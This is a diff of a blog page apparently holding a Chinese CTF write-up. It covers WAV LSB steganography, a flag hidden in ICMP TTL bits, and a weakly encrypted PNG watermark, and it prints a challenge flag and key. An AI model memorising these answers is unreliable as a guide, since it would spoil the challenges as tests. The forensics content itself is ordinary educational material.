+<p><img loading="lazy" src="imgs/image-20250419162621758.png" alt="imgs/image-20250419162621758.png" srcset="imgs/image-20250419162621758.png?size=small, imgs/image-20250419162621758.png?size=medium 1.5x, imgs/image-20250419162621758.png?size=large 2x" data-title="imgs/image-20250419162621758.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419162925306.png" alt="imgs/image-20250419162925306.png" srcset="imgs/image-20250419162925306.png?size=small, imgs/image-20250419162925306.png?size=medium 1.5x, imgs/image-20250419162925306.png?size=large 2x" data-title="imgs/image-20250419162925306.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419162956540.png" alt="imgs/image-20250419162956540.png" srcset="imgs/image-20250419162956540.png?size=small, imgs/image-20250419162956540.png?size=medium 1.5x, imgs/image-20250419162956540.png?size=large 2x" data-title="imgs/image-20250419162956540.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419162847980.png" alt="imgs/image-20250419162847980.png" srcset="imgs/image-20250419162847980.png?size=small, imgs/image-20250419162847980.png?size=medium 1.5x, imgs/image-20250419162847980.png?size=large 2x" data-title="imgs/image-20250419162847980.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="imgs/image-20250419162830766.png" alt="imgs/image-20250419162830766.png" srcset="imgs/image-20250419162830766.png?size=small, imgs/image-20250419162830766.png?size=medium 1.5x, imgs/image-20250419162830766.png?size=large 2x" data-title="imgs/image-20250419162830766.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h3 id="题目名称-并非乱ping" class="heading-element">
   <a href="#%e9%a2%98%e7%9b%ae%e5%90%8d%e7%a7%b0-%e5%b9%b6%e9%9d%9e%e4%b9%b1ping" class="heading-mark"></a>题目名称 并非乱ping</h3><p>题目附件给了一个加密的压缩包、一个wav以及一个<code>hide.py</code></p>
 <p><img loading="lazy" src="imgs/image-20250417201252117.png" alt="imgs/image-20250417201252117.png" srcset="imgs/image-20250417201252117.png?size=small, imgs/image-20250417201252117.png?size=medium 1.5x, imgs/image-20250417201252117.png?size=large 2x" data-title="imgs/image-20250417201252117.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>其中<code>hide.py</code>的内容如下</p>
-<div class="highlight" id="id-15"><div class="chroma">
+<div class="highlight" id="id-17"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1377,7 +1575,7 @@
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;successfully!&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>发现是一个利用wav二进制倒数第3位进行LSB隐写的脚本，因此我们写个脚本提取一下隐写的数据即可</p>
-<div class="highlight" id="id-16"><div class="chroma">
+<div class="highlight" id="id-18"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1443,7 +1641,7 @@
 <p>打开流量包，结合题目名字很容易知道解题关键在ping上，即ICMP流量中</p>
 <p>翻看流量包的相关字段，猜测flag是被隐藏在了ICMP流量的ttl时延中</p>
 <p><img loading="lazy" src="imgs/image-20250417201804808.png" alt="imgs/image-20250417201804808.png" srcset="imgs/image-20250417201804808.png?size=small, imgs/image-20250417201804808.png?size=medium 1.5x, imgs/image-20250417201804808.png?size=large 2x" data-title="imgs/image-20250417201804808.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
-<div class="highlight" id="id-17"><div class="chroma">
+<div class="highlight" id="id-19"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -1453,7 +1651,7 @@
 </div><p>然后结合flag的前缀<code>DASCTF{</code>，发现flag被隐藏在ttl二进制的前两位中</p>
 <p><img loading="lazy" src="imgs/image-20250417203304205.png" alt="imgs/image-20250417203304205.png" srcset="imgs/image-20250417203304205.png?size=small, imgs/image-20250417203304205.png?size=medium 1.5x, imgs/image-20250417203304205.png?size=large 2x" data-title="imgs/image-20250417203304205.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>因此写个脚本提取ttl二进制的前两位，连起来转字符串即可得到最后的flag：<code>DASCTF{627848c0-759c-11ef-999f-000c290c196e}</code></p>
-<div class="highlight" id="id-18"><div class="chroma">
+<div class="highlight" id="id-20"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1499,7 +1697,7 @@
 <p>本题的成功解出离不开<code>@IcePeak</code>师傅的帮助</p>
 </blockquote>
 <p>解压附件压缩包，可以得到一个<code>encrypt.py</code>和一张PNG图片，内容如下所示</p>
-<div class="highlight" id="id-19"><div class="chroma">
+<div class="highlight" id="id-21"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1552,7 +1750,7 @@
 <p>发现是用弱密码简单加密了一下图片，然后我们用stegsolve打开图片可以发现图片存在LSB隐写</p>
 <p><img loading="lazy" src="imgs/image-20250331201900614.png" alt="imgs/image-20250331201900614.png" srcset="imgs/image-20250331201900614.png?size=small, imgs/image-20250331201900614.png?size=medium 1.5x, imgs/image-20250331201900614.png?size=large 2x" data-title="imgs/image-20250331201900614.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>因此我们根据LSB隐写的内容写个脚本爆破一下密钥即可</p>
-<div class="highlight" id="id-20"><div class="chroma">
+<div class="highlight" id="id-22"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1615,7 +1813,7 @@
 <p>提取出来base64解码即可得到下图</p>
 <p><img loading="lazy" src="imgs/image-20250401183228651.png" alt="imgs/image-20250401183228651.png" srcset="imgs/image-20250401183228651.png?size=small, imgs/image-20250401183228651.png?size=medium 1.5x, imgs/image-20250401183228651.png?size=large 2x" data-title="imgs/image-20250401183228651.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
 <p>参考上面<code>2024WMCTF</code>那道题的wp，改一下提取水印的脚本</p>
-<div class="highlight" id="id-21"><div class="chroma">
+<div class="highlight" id="id-23"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
@@ -1699,7 +1897,7 @@
 </span></span><span class="line"><span class="cl"><span class="c1"># b&#34;Hey boy, I&#39;m here to help you, now you&#39;ze one step away from successl let me |ell you key:79557c2d8f94&#34;</span></span></span></code></pre></td></tr></table>
 </div>
 </div><p>运行后可以得到如下内容，提示了我们一个key：<code>79557c2d8f94</code></p>
-<div class="highlight" id="id-22"><div class="chroma">
+<div class="highlight" id="id-24"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
@@ -1725,7 +1923,7 @@
   <div class="post-info">
     <div class="post-info-line">
       <div class="post-info-mod">
-        <span title="Updated on 2025-04-17 12:35:37">Updated on 2025-04-17&nbsp;</span>
+        <span title="Updated on 2025-04-19 15:35:37">Updated on 2025-04-19&nbsp;</span>
       </div></div><div class="post-info-line">
         <div class="post-info-md"><span><a href="/posts/f002407/index.md" title="Read Markdown" class="link-to-markdown">Read Markdown</a></span></div>
         <div class="post-info-share">
